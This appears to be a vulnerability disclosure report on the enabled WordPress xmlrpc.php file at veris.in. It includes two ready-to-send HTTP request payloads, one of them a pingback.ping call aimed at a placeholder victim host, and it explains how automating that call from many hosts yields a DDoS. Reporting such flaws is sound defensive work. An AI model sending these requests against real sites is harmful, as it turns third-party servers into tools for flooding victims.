Summary:

Hi team,

Wordpress blogs that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The website veris.in has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.

PoC:
====
In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp proxy, send the request below:
```
POST /xmlrpc.php HTTP/1.1 
Host: veris.in 
Connection: keep-alive 
Content-Length: 175

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>demo.sayHello</methodName> 
<params> 
<param>
<value>admin</value>
</param> 
</params> 
</methodCall>
```

- Notice that a successful response is received showing that the xmlrpc.php file is enabled.

 
- The xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below:

```
POST /xmlrpc.php HTTP/1.1 
Host: veris.in
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://victim.com</string></value>
</param>
<param>
<value><string>https://veris.in/anypost</string></value>
</param>
</params>
</methodCall>
```
- As soon as the above request is sent, the victim host gets an entry in its log file with a request originating from the veris.in domain verifying the pingback.

- This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.

- If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks.
